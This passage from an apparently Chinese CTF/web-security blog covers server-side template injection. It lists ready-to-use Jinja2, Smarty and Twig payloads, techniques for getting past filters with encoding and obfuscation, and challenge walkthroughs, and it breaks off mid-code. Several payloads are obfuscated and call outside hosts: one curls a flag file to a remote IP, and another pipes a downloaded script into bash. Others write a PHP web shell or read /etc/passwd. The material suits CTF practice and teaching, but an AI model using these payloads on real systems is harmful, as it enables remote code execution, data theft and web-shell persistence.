class="line">http://127.0.0.1:5000/?id=&#123;%for%0ai%0ain%0a&quot;&quot;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u006d\u0072\u006f\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(1)|attr(&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;)()%&#125;&#123;%%0aif%0a(i|attr(&quot;\u005f\u005f\u006e\u0061\u006d\u0065\u005f\u005f&quot;))==&quot;\u0063\u0061\u0074\u0063\u0068\u005f\u0077\u0061\u0072\u006e\u0069\u006e\u0067\u0073&quot;%0a%&#125;&#123;%%0aif%0a(i|attr(&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(&quot;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(&quot;\u0065\u0076\u0061\u006c&quot;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;curl http://47.xxxxxxx.241:2333 -d `cat /f*`&#x27;).read()&quot;)%&#125;&#123;%%0aendif%0a%&#125;&#123;%%0aendif%0a%&#125;&#123;%%0aendfor%0a%&#125;</span><br></pre></td></tr></table></figure><p><a href="https://pic.pysnow.cn/post/image-20220724181240349.png"><img src="https://pic.pysnow.cn/post/image-20220724181240349.png" alt="image-20220724181240349"></a></p><p><strong>蓝色部分要Unicode编码一下，然后直接通过curl外带就行了</strong></p><p><a href="https://pic.pysnow.cn/post/image-20220724181337164.png"><img src="https://pic.pysnow.cn/post/image-20220724181337164.png" alt="image-20220724181337164"></a></p><h5 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;phpinfo()&#125;&#125;                     &#123;if phpinfo()&#125;&#123;/if&#125;</span><br><span class="line">&#123;&#123;readfile(&#x27;文件路径&#x27;)&#125;&#125;           &#123;if readfile(&#x27;文件路劲&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">&#123;&#123;show_soure(&#x27;文件路径&#x27;)&#125;&#125;         &#123;if show_source(&#x27;文件路径&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">&#123;&#123;passthru(&#x27;操作命令&#x27;)&#125;&#125;           &#123;if passthru(&#x27;操作命令&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">&#123;&#123;system(&#x27;操作命令&#x27;)&#125;&#125;  &#123;if system(&#x27;操作命令&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">&#123;&#123;exec(&#x27;操作命令&#x27;)&#125;&#125;               &#123;if exec(&#x27;操作命令&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">&#123;&#123;shell_exec(&#x27;操作命令&#x27;)&#125;&#125;         &#123;if shell_exec(&#x27;操作命令&#x27;)&#125;&#123;/if&#125;</span><br><span class="line"></span><br><span class="line">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;,self::clearConfig())&#125;</span><br></pre></td></tr></table></figure><h5 id="Jinja2"><a href="#Jinja2" class="headerlink" title="Jinja2"></a>Jinja2</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Python2:</span><br><span class="line"><span class="comment">#(system函数换为popen(&#x27;&#x27;).read()，需要导入os模块)  </span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125; </span><br><span class="line"><span class="comment">#(不需要导入os模块，直接从别的模块调用)</span></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"><span class="comment">#常用的py2 EXP</span></span><br><span class="line">().__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;type flag.txt&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">Python3:</span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h5 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">&quot;id&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>详细讲述Flask</p><p><a href="https://www.cnblogs.com/article-kelp/p/14797393.html">https://www.cnblogs.com/article-kelp/p/14797393.html</a></p><h4 id="过滤及绕过"><a href="#过滤及绕过" class="headerlink" title="过滤及绕过"></a>过滤及绕过</h4><p>参考文章<a href="https://blog.csdn.net/miuzzx/article/details/110220425">https://blog.csdn.net/miuzzx/article/details/110220425</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You can use a dot (.) to access attributes of a variable in addition to the standard Python __getitem__ &quot;subscript&quot; syntax ([]). --官方原文</span><br></pre></td></tr></table></figure><p>也就是说<br>除了标准的python语法使用点<code>（.）</code>外，还可以使用中括号<code>（[]）</code>来访问变量的属性。<br>比如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>[<span class="string">&#x27;__classs__&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure><p>所以过滤了点，我们还可以用中括号绕过。<br>如果想调用字典中的键值，其本质其实是调用了魔术方法<code>__getitem__</code><br>所以对于取字典中键值的情况不仅可以用<code>[]</code>，也可以用<code>__getitem__</code></p><p>当然对于字典来说，我们也可以用他自带的一些方法了。pop就是其中的一个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop(key[,default])</span><br><span class="line">参数</span><br><span class="line">key: 要删除的键值</span><br><span class="line">default: 如果没有 key，返回 default 值</span><br><span class="line">删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。</span><br></pre></td></tr></table></figure><p>我们要使用字典中的键值的话，也可以用<code>list.pop(&quot;var&quot;)</code>,但大家最好不要用这个，除非万不得已，因为会删除里面的键，如果删除的是一些程序运行需要用到的，就可能使得服务器崩溃。然后过了一遍字典的方法，发现get和setdefault是个不错的选择</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dict.get(key, default=None)</span><br><span class="line">返回指定键的值，如果值不在字典中返回default值</span><br><span class="line"></span><br><span class="line">dict.setdefault(key, default=None)</span><br><span class="line">和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__.__getitem__(<span class="string">&#x27;__builtins__&#x27;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__.pop(<span class="string">&#x27;__builtins__&#x27;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__.get(<span class="string">&#x27;__builtins__&#x27;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__.setdefault(<span class="string">&#x27;__builtins__&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>那么调用对象的方法具体是什么原理呢，其实他是调用了魔术方法<code>__getattribute__</code></p><p>即</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__</span><br><span class="line"><span class="string">&quot;&quot;</span>.__getattribute__(<span class="string">&quot;__class__&quot;</span>)</span><br></pre></td></tr></table></figure><p>那我们就顺势讲一下字符串的一些处理方法。</p><p><strong>1、拼接</strong><br><code>&quot;cla&quot;+&quot;ss&quot;</code></p><p><strong>2、反转</strong><br><code>&quot;__ssalc__&quot;[::-1]</code></p><p>但是实际上我发现其实加号是多余的，在jinjia2里面，<code>&quot;cla&quot;&quot;ss&quot;</code>是等同于<code>&quot;class&quot;</code>的，也就是说我们可以这样引用class，并且绕过字符串过滤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;__cla&quot;</span><span class="string">&quot;ss__&quot;</span>]</span><br><span class="line"><span class="string">&quot;&quot;</span>.__getattribute__(<span class="string">&quot;__cla&quot;</span><span class="string">&quot;ss__&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;__ssalc__&quot;</span>][::-<span class="number">1</span>]</span><br><span class="line"><span class="string">&quot;&quot;</span>.__getattribute__(<span class="string">&quot;__ssalc__&quot;</span>[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p><strong>3、ascii转换</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&#123;0:c&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">97</span>)=<span class="string">&#x27;a&#x27;</span></span><br><span class="line"><span class="string">&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">95</span>,<span class="number">95</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">95</span>)=<span class="string">&#x27;__class__&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>4、编码绕过</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;__class__&quot;</span>==<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>==<span class="string">&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;</span></span><br><span class="line">对于python2的话，还可以利用base64进行绕过</span><br><span class="line"><span class="string">&quot;__class__&quot;</span>==(<span class="string">&quot;X19jbGFzc19f&quot;</span>).decode(<span class="string">&quot;base64&quot;</span>)</span><br></pre></td></tr></table></figure><p><strong>5、利用chr函数</strong><br>因为我们没法直接使用chr函数，所以需要通过__builtins__找到他</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">chr</span> %&#125;</span><br><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>[<span class="built_in">chr</span>(<span class="number">95</span>)%2bchr(<span class="number">95</span>)%2bchr(<span class="number">99</span>)%2bchr(<span class="number">108</span>)%2bchr(<span class="number">97</span>)%2bchr(<span class="number">115</span>)%2bchr(<span class="number">115</span>)%2bchr(<span class="number">95</span>)%2bchr(<span class="number">95</span>)]&#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>6、在jinja2里面可以利用~进行拼接</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> a=<span class="string">&#x27;__cla&#x27;</span> %&#125;&#123;%<span class="built_in">set</span> b=<span class="string">&#x27;ss__&#x27;</span>%&#125;&#123;&#123;<span class="string">&quot;&quot;</span>[a~b]&#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>7、大小写转换</strong><br>前提是过滤的只是小写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;__CLASS__&quot;</span>.lower()]</span><br></pre></td></tr></table></figure><p><strong>attr</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get an attribute of an object. foo|attr(&quot;bar&quot;) works like foo.bar just that always an attribute is returned and items are not looked up.</span><br></pre></td></tr></table></figure><p>也就是说 attr用于获取变量</p><p>例如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>|attr(<span class="string">&quot;__class__&quot;</span>)</span><br><span class="line">相当于</span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__</span><br></pre></td></tr></table></figure><p><strong><code>__getitem__</code></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">绕中括号限制</span><br><span class="line"><span class="comment">#即将mro_[2]等价于__getitem__(2)即可</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>)&lt;-&gt; 等价于<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#绕过方法2:利用pop(40)绕</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">40</span>)(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="comment">#使用 .getlist()方法绕</span></span><br><span class="line">blacklist = [<span class="string">&quot;__&quot;</span>,<span class="string">&quot;request[request.&quot;</span>,<span class="string">&quot;__class__&quot;</span>,<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;]&#x27;</span>]</span><br><span class="line">&#123;&#123;request|attr(request.args.getlist(request.args.l)|join)&#125;&#125;&amp;l=a&amp;a=_&amp;a=_&amp;a=<span class="keyword">class</span>&amp;a=_&amp;a=_</span><br></pre></td></tr></table></figure><p><strong>format</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apply the given values to a printf-style <span class="built_in">format</span> string, like string % values.</span><br></pre></td></tr></table></figure><p>功能和我们前面讲到的字符串绕过中的format类似。<br>用法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;%s, %s!&quot;|format(greeting, name) &#125;&#125;</span><br></pre></td></tr></table></figure><p>那么我们想要调用<code>__class__</code>就可以用format了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;%c%c%c%c%c%c%c%c%c&quot;</span>|<span class="built_in">format</span>(<span class="number">95</span>,<span class="number">95</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">95</span>)==<span class="string">&#x27;__class__&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;%c%c%c%c%c%c%c%c%c&quot;</span>|<span class="built_in">format</span>(<span class="number">95</span>,<span class="number">95</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">95</span>)]</span><br></pre></td></tr></table></figure><p><strong>first last random</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Return the first item of a sequence.</span><br><span class="line">Return the last item of a sequence.</span><br><span class="line">Return a random item from the sequence.</span><br></pre></td></tr></table></figure><p>前两个其实用处不是很大，因为他只能返回第一个值或者最后一个，当然，如果我们用的就是第一个或者最后一个那就ok了。    random的话是随机返回，这样我们跑个脚本肯定是可以得到我们想要的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__|last()</span><br><span class="line">相当于</span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__[-<span class="number">1</span>]</span><br></pre></td></tr></table></figure><p><strong>join</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Return a string which <span class="keyword">is</span> the concatenation of the strings <span class="keyword">in</span> the sequence. The separator between elements <span class="keyword">is</span> an</span><br><span class="line">empty string per default, you can define it <span class="keyword">with</span> the optional parameter:</span><br><span class="line"></span><br><span class="line">&#123;&#123; [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]|join(<span class="string">&#x27;|&#x27;</span>) &#125;&#125; -&gt; <span class="number">1</span>|<span class="number">2</span>|<span class="number">3</span></span><br><span class="line"></span><br><span class="line">&#123;&#123; [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]|join &#125;&#125; -&gt; <span class="number">123</span></span><br><span class="line">It <span class="keyword">is</span> also possible to join certain attributes of an <span class="built_in">object</span>:</span><br><span class="line"></span><br><span class="line">&#123;&#123; users|join(<span class="string">&#x27;, &#x27;</span>, attribute=<span class="string">&#x27;username&#x27;</span>) &#125;&#125;</span><br></pre></td></tr></table></figure><p>于是我们又多了一种字符串拼接的方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>[[<span class="string">&#x27;__clas&#x27;</span>,<span class="string">&#x27;s__&#x27;</span>]|join] 或者 <span class="string">&quot;&quot;</span>[(<span class="string">&#x27;__clas&#x27;</span>,<span class="string">&#x27;s__&#x27;</span>)|join]</span><br><span class="line">相当于  <span class="string">&quot;&quot;</span>[<span class="string">&quot;__class__&quot;</span>]</span><br></pre></td></tr></table></figure><p><strong>lower</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Convert a value to lowercase.</span><br><span class="line">功能类似于前面的转换成小写</span><br><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;__CLASS__&quot;</span>|lower]</span><br></pre></td></tr></table></figure><p><strong>replace reverse</strong></p><p>我们可以利用替换和反转还原回我们要用的字符串了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;__claee__&quot;</span>|replace(<span class="string">&quot;ee&quot;</span>,<span class="string">&quot;ss&quot;</span>) 构造出字符串 <span class="string">&quot;__class__&quot;</span></span><br><span class="line"><span class="string">&quot;__ssalc__&quot;</span>|reverse 构造出 <span class="string">&quot;__class__&quot;</span></span><br></pre></td></tr></table></figure><p><strong>string</strong></p><p>功能类似于python内置函数 str<br>有了这个的话我们可以把显示到浏览器中的值全部转换为字符串再通过下标引用，就可以构造出一些字符了，再通过拼接就能构成特定的字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__   出来的是&lt;<span class="keyword">class</span> <span class="string">&#x27;tuple&#x27;</span>&gt;</span><br><span class="line">(().__class__|string)[<span class="number">0</span>] 出来的是&lt;</span><br></pre></td></tr></table></figure><p><strong>select unique</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">()|select|string</span><br><span class="line">结果如下</span><br><span class="line">&lt;generator <span class="built_in">object</span> select_or_reject at <span class="number">0x0000022717FF33C0</span>&gt;</span><br><span class="line">这样我们会拥有比前面更多的字符来用于拼接</span><br><span class="line">(()|select|string)[<span class="number">24</span>]~</span><br><span class="line">(()|select|string)[<span class="number">24</span>]~</span><br><span class="line">(()|select|string)[<span class="number">15</span>]~</span><br><span class="line">(()|select|string)[<span class="number">20</span>]~</span><br><span class="line">(()|select|string)[<span class="number">6</span>]~</span><br><span class="line">(()|select|string)[<span class="number">18</span>]~</span><br><span class="line">(()|select|string)[<span class="number">18</span>]~</span><br><span class="line">(()|select|string)[<span class="number">24</span>]~</span><br><span class="line">(()|select|string)[<span class="number">24</span>]</span><br><span class="line"></span><br><span class="line">得到字符串<span class="string">&quot;__class__&quot;</span></span><br></pre></td></tr></table></figure><p><strong>list</strong></p><p>转换成列表<br>更多的用途是配合上面的string转换成列表，就可以调用列表里面的方法取字符了<br>只是单纯的字符串的话取单个字符方法有限</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(()|select|string)[<span class="number">0</span>]</span><br><span class="line">如果中括号被过滤了，挺难的</span><br><span class="line">但是列表的话就可以用pop取下标了</span><br><span class="line">当然都可以使用__getitem__</span><br><span class="line"></span><br><span class="line">(()|select|string|<span class="built_in">list</span>).pop(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>比较烦的绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;%if(micgo|attr(&quot;__init__&quot;)|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)|attr(&quot;__builtins__&quot;)|attr(&quot;__getitem__&quot;)(&quot;eval&quot;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;curl 124.223.30.79:91/1.txt|bash&#x27;).read()&quot;)))%&#125;1&#123;%endif%&#125;</span><br><span class="line">八进制编码：</span><br><span class="line">&#123;%25if(micgo|attr(&quot;\137\137\151\156\151\164\137\137&quot;)|attr(&quot;\137\137\147\154\157\142\141\154\163\137\137&quot;)|attr(&quot;\137\137\147\145\164\151\164\145\155\137\137&quot;)(&quot;\137\137\142\165\151\154\164\151\156\163\137\137&quot;)|attr(&quot;\137\137\147\145\164\151\164\145\155\137\137&quot;)(&quot;\145\166\141\154&quot;)(&quot;\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\160\157\160\145\156\50\47\143\165\162\154\40\61\62\64\56\62\62\63\56\63\60\56\67\71\72\71\61\57\61\56\164\170\164\174\142\141\163\150\47\51\56\162\145\141\144\50\51&quot;))%25&#125;1&#123;%25endif%25&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;%print(()[&quot;\137\137\143\154\141\163\163\137\137&quot;][&quot;\137\137\142\141\163\145\137\137&quot;][&quot;\137\137\163\165\142\143\154\141\163\163\145\163\137\137&quot;]()[95][&quot;\137\137\151\156\151\164\137\137&quot;][&quot;\137\137\147\154\157\142\141\154\163\137\137&quot;][&quot;\137\137\142\165\151\154\164\151\156\163\137\137&quot;][&quot;\137\137\151\155\160\157\162\164\137\137&quot;](&quot;o&quot;&quot;s&quot;)[&quot;\160\157\160\145\156&quot;](&quot;ls%09/&quot;)[&quot;\162\145\141\144&quot;]())%&#125;</span><br></pre></td></tr></table></figure><h4 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h4><p><img src="https://i0.hdslb.com/bfs/album/f920a94f9dc89759a5019c3d2d5e42718e4f2b3a.png" alt="img"></p><p>依次尝试访问文件</p><p><img src="https://i0.hdslb.com/bfs/album/11d36a19d455729b997a9b45418a9bac978d769c.png" alt="img"></p><p><img src="https://i0.hdslb.com/bfs/album/b13d6899360f9671c2574b55f5f0088d0a6ffe57.png" alt="img"></p><p><img src="https://i0.hdslb.com/bfs/album/ffe4de850c4ab27217a7775263fcb9f306d43587.png" alt="img"></p><p>变量 filename 的值总是为要访问的文件，再根据提示三和 filehash 三个不同的值猜测 filehash 的值为MD5加密后的字符串。</p><p>filename知道了，cookie_secret在哪呢？hints提示render，又根据题目easy_tornado，可推测是服务器模板注入。<br>因为render（）是tornado里的函数，可以生成html模板。是一个渲染函数 ，就是一个公式，能输出前端页面的公式。tornado是用Python编写的Web服务器兼Web应用框架，简单来说就是用来生成模板的东西。和Python相关，和模板相关，就可以推测这可能是个ssti注入题了。</p><p>那我们开始初步尝试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/file?filename=/fllllllllllllag&amp;filehash=&#123;&#123;1&#125;&#125;</span><br></pre></td></tr></table></figure><p>得到关键报错信息：</p><p>发现存在模板注入<br>在Tornado的前端页面模板中，datetime是指向python中datetime这个模块，Tornado提供了一些对象别名来快速访问对象，通过查阅文档发现cookie_secret在Application对象settings属性中，还发现self.application.settings有一个别名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RequestHandler.settings</span><br><span class="line">An alias <span class="keyword">for</span> <span class="built_in">self</span>.application.settings.</span><br></pre></td></tr></table></figure><p>handler指向的处理当前这个页面的RequestHandler对象，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RequestHandler.settings指向self.application.settings</span><br></pre></td></tr></table></figure><p>因此handler.settings指向RequestHandler.application.settings。</p><p>构造payload获取cookie_secret</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure><p>得到cookie_secret: 7837cb65-a58d-4897-9e1e-efdebe9b75b5</p><p><img src="https://i0.hdslb.com/bfs/album/47329bc1700687026878adcae334905e1067461e.png" alt="image-20220515094256956"></p><h4 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 